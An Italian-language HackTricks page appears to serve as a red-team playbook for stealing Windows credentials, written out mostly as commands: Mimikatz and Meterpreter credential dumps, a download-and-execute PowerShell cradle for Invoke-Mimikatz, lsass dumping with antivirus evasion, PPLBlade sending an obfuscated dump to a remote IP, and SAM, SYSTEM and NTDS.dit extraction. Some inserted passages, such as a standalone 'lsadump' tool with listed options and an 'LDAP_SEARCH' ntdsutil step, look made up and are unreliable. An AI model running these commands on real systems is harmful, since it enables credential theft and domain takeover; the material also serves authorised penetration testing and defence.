# Rubare le credenziali di Windows

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Mimikatz per rubare le credenziali
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trova altre funzionalità che Mimikatz può eseguire in** [**questa pagina**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Scopri qui alcune possibili protezioni per le credenziali.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**

## Credenziali con Meterpreter

Utilizza il [**Plugin Credenziali**](https://github.com/carlospolop/MSF-Credentials) **che ho creato per cercare password e hash** all'interno della vittima.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassare l'AV

### Procdump + Mimikatz

Poiché **Procdump di** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**è uno strumento legittimo di Microsoft**, non viene rilevato da Defender.\
Puoi utilizzare questo strumento per **eseguire il dump del processo lsass**, **scaricare il dump** ed **estrarre** le **credenziali localmente** dal dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Estrarre le credenziali dal dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alcuni **AV** possono **rilevare** come **malizioso** l'uso di **procdump.exe per eseguire il dump di lsass.exe**, questo perché rilevano la stringa **"procdump.exe" e "lsass.exe"**. Pertanto, è più **furtivo** **passare** come **argomento** il **PID** di lsass.exe a procdump **anziché** il nome lsass.exe.

### Estrarre lsass con **comsvcs.dll**

Una DLL chiamata **comsvcs.dll** trovata in `C:\Windows\System32` è responsabile per l'**estrazione della memoria del processo** in caso di crash. Questa DLL include una **funzione** chiamata **`MiniDumpW`**, progettata per essere invocata utilizzando `rundll32.exe`.\
I primi due argomenti sono irrilevanti, ma il terzo è diviso in tre componenti. L'ID del processo da estrarre costituisce la prima componente, la posizione del file di dump rappresenta la seconda e la terza componente è strettamente la parola **full**. Non esistono opzioni alternative.\
Dopo aver analizzato queste tre componenti, la DLL si impegna a creare il file di dump e a trasferire la memoria del processo specificato in questo file.\
L'utilizzo della **comsvcs.dll** è fattibile per estrarre il processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio su [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Il seguente comando viene utilizzato per l'esecuzione:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping di lsass con Task Manager**

1. Fai clic con il pulsante destro del mouse sulla barra delle applicazioni e fai clic su Task Manager
2. Fai clic su Altre informazioni
3. Cerca il processo "Local Security Authority Process" nella scheda Processi
4. Fai clic con il pulsante destro del mouse sul processo "Local Security Authority Process" e fai clic su "Crea file di dump".

### Dumping di lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un file binario firmato da Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è uno strumento di dumping di processi protetti che supporta l'oscuramento del dump di memoria e il trasferimento su workstation remote senza depositarlo sul disco.

**Funzionalità chiave**:

1. Bypass della protezione PPL
2. Oscuramento dei file di dump di memoria per eludere i meccanismi di rilevamento basati su firme di Defender
3. Caricamento del dump di memoria con metodi di caricamento RAW e SMB senza depositarlo sul disco (dump senza file)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dump delle hash SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump delle credenziali LSA

Per ottenere le credenziali memorizzate nel Local Security Authority (LSA) di un sistema Windows, è possibile utilizzare il tool `lsadump`. Questo strumento consente di estrarre le informazioni sensibili, come le password degli account utente, dal database LSA.

#### Esecuzione del dump delle credenziali LSA

1. Scaricare il tool `lsadump` da [qui](https://github.com/AlessandroZ/BeRoot/tree/master/Windows/Tools/lsadump).
2. Eseguire il comando seguente per eseguire il dump delle credenziali LSA:

```plaintext
lsadump <opzioni>
```

#### Opzioni disponibili per il dump delle credenziali LSA

- `-sam`: Esegue il dump delle credenziali SAM (Security Account Manager).
- `-secrets`: Esegue il dump delle credenziali LSA Secrets.
- `-cache`: Esegue il dump delle credenziali LSA Cache.
- `-system`: Specifica il percorso del file SYSTEM da utilizzare per il dump delle credenziali LSA.
- `-security`: Specifica il percorso del file SECURITY da utilizzare per il dump delle credenziali LSA.

#### Esempio di dump delle credenziali LSA

```plaintext
lsadump -secrets
```

Questo comando eseguirà il dump delle credenziali LSA Secrets e mostrerà le informazioni sensibili, come le password degli account utente, nel terminale.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Estrarre il file NTDS.dit dal DC di destinazione

Per ottenere le credenziali degli utenti dal controller di dominio di destinazione, è necessario estrarre il file NTDS.dit. Questo file contiene il database Active Directory, che include le informazioni sugli account degli utenti e le relative password hash.

Per eseguire questa operazione, è possibile utilizzare strumenti come `ntdsutil` o `mimikatz`. Questi strumenti consentono di accedere al controller di dominio di destinazione e copiare il file NTDS.dit in un percorso accessibile.

Una volta ottenuto il file NTDS.dit, è possibile utilizzare strumenti come `hashcat` o `John the Ripper` per decifrare le password hash e ottenere le credenziali degli utenti.

È importante notare che l'estrazione del file NTDS.dit da un controller di dominio richiede privilegi di amministratore o accesso fisico al server. Inoltre, questa operazione potrebbe essere considerata illegale senza il consenso del proprietario del sistema.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Estrarre la cronologia delle password NTDS.dit dal DC di destinazione

Per ottenere la cronologia delle password dal file NTDS.dit su un controller di dominio di destinazione, è possibile utilizzare il seguente metodo:

1. Ottenere l'accesso al controller di dominio di destinazione.
2. Eseguire il dump del file NTDS.dit utilizzando strumenti come `ntdsutil` o `mimikatz`.
3. Analizzare il file NTDS.dit per estrarre la cronologia delle password.

È importante notare che l'accesso al controller di dominio di destinazione potrebbe richiedere privilegi elevati e potrebbe essere necessario bypassare le misure di sicurezza per ottenere l'accesso. Si consiglia di utilizzare queste informazioni solo per scopi legittimi, come test di sicurezza o per scopi di amministrazione di sistema.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Mostra l'attributo pwdLastSet per ciascun account NTDS.dit

Per visualizzare l'attributo pwdLastSet per ciascun account NTDS.dit, esegui i seguenti passaggi:

1. Apri un prompt dei comandi come amministratore.
2. Esegui il comando seguente per accedere all'interfaccia di Active Directory:
```
ntdsutil
```
3. Successivamente, esegui il comando seguente per passare alla modalità "Activate Instance NTDS":
```
activate instance ntds
```
4. Infine, esegui il comando seguente per visualizzare l'attributo pwdLastSet per ciascun account NTDS.dit:
```
LDAP_SEARCH "(&(objectCategory=person)(objectClass=user))" pwdLastSet
```

Una volta eseguiti questi passaggi, verranno mostrati i valori dell'attributo pwdLastSet per ciascun account NTDS.dit.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Rubare SAM & SYSTEM

Questi file dovrebbero essere **posizionati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in modo normale** perché sono protetti.

### Dal Registro di sistema

Il modo più semplice per rubare questi file è ottenere una copia dal registro di sistema:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Scarica** quei file sulla tua macchina Kali e **estraine gli hash** utilizzando:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

È possibile eseguire una copia dei file protetti utilizzando questo servizio. È necessario essere Amministratore.

#### Utilizzando vssadmin

Il binario vssadmin è disponibile solo nelle versioni di Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ma è possibile fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (l'unità disco rigido utilizzata è "C:" e viene salvato in C:\users\Public), ma è possibile utilizzarlo per copiare qualsiasi file protetto:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Codice dal libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Infine, è possibile utilizzare lo script **Invoke-NinjaCopy** [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per fare una copia di SAM, SYSTEM e ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credenziali di Active Directory - NTDS.dit**

Il file **NTDS.dit** è conosciuto come il cuore di **Active Directory**, che contiene dati cruciali sugli oggetti utente, i gruppi e le loro appartenenze. È qui che vengono memorizzati gli **hash delle password** degli utenti di dominio. Questo file è un database di **Extensible Storage Engine (ESE)** e si trova in **_%SystemRoom%/NTDS/ntds.dit_**.

All'interno di questo database, vengono mantenute tre tabelle principali:

- **Tabella dei dati**: Questa tabella è incaricata di memorizzare i dettagli sugli oggetti come utenti e gruppi.
- **Tabella dei collegamenti**: Tiene traccia delle relazioni, come l'appartenenza ai gruppi.
- **Tabella SD**: Qui vengono conservati i **descrittori di sicurezza** per ogni oggetto, garantendo la sicurezza e il controllo degli accessi per gli oggetti memorizzati.

Ulteriori informazioni su questo: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilizza _Ntdsa.dll_ per interagire con quel file ed è utilizzato da _lsass.exe_. Quindi, **parte** del file **NTDS.dit** potrebbe essere situata **all'interno della memoria di `lsass`** (è possibile trovare i dati più recentemente accessati probabilmente a causa del miglioramento delle prestazioni mediante l'utilizzo di una **cache**).

#### Decrittazione degli hash all'interno di NTDS.dit

L'hash è cifrato 3 volte:

1. Decrittare la Password Encryption Key (**PEK**) utilizzando il **BOOTKEY** e **RC4**.
2. Decrittare l'**hash** utilizzando **PEK** e **RC4**.
3. Decrittare l'**hash** utilizzando **DES**.

**PEK** ha lo **stesso valore** in **ogni controller di dominio**, ma è **cifrato** all'interno del file **NTDS.dit** utilizzando il **BOOTKEY** del **file SYSTEM del controller di dominio (che è diverso tra i controller di dominio)**. Ecco perché per ottenere le credenziali dal file NTDS.dit **è necessario avere i file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copiare NTDS.dit utilizzando Ntdsutil

Disponibile da Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
È possibile utilizzare anche il trucco del [**volume shadow copy**](./#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che avrai bisogno anche di una copia del file **SYSTEM** (di nuovo, [**estrailo dal registro o usa il trucco del volume shadow copy**](./#stealing-sam-and-system)).

### **Estrazione degli hash da NTDS.dit**

Una volta che hai **ottenuto** i file **NTDS.dit** e **SYSTEM**, puoi utilizzare strumenti come _secretsdump.py_ per **estrarre gli hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Puoi anche **estrarli automaticamente** utilizzando un utente di dominio amministratore valido:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Per i file **NTDS.dit** di grandi dimensioni, si consiglia di estrarli utilizzando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Inoltre, è possibile utilizzare il modulo **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**

Gli oggetti NTDS possono essere estratti in un database SQLite utilizzando [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non solo vengono estratti i segreti, ma anche l'intero oggetto e i relativi attributi per ulteriori informazioni quando il file NTDS.dit grezzo è già stato recuperato.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
L'alveare `SYSTEM` è opzionale ma consente la decrittazione delle informazioni segrete (hash NT e LM, credenziali supplementari come password in testo normale, chiavi di Kerberos o di trust, cronologia delle password NT e LM). Oltre ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i loro hash, flag UAC, timestamp dell'ultimo accesso e del cambio password, descrizione degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle unità organizzative e appartenenze, domini fidati con tipo di trust, direzione e attributi...

## Lazagne

Scarica il file binario da [qui](https://github.com/AlessandroZ/LaZagne/releases). Puoi utilizzare questo binario per estrarre le credenziali da diversi software.
```
lazagne.exe all
```
## Altri strumenti per estrarre le credenziali da SAM e LSASS

### Windows credentials Editor (WCE)

Questo strumento può essere utilizzato per estrarre le credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Estrai le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Estrae le credenziali dal file SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Scaricalo da: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) e semplicemente **eseguilo** e le password saranno estratte.

## Difese

[**Scopri alcune protezioni per le credenziali qui.**](credentials-protections.md)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
